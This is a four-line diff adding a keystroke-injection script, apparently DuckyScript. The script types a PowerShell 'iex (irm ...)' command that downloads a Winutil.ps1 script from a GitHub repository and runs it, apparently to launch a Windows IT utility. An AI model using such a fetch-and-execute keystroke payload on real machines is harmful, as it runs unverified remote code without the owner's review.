@@ -1,0 +1,4 @@
+DELAY 1000
+STRING iex (irm "https://raw.githubusercontent.com/IT-Tool-by-SalgadoTech/ittool-External_Tools/main/Winutil.ps1")
+ENTER
+
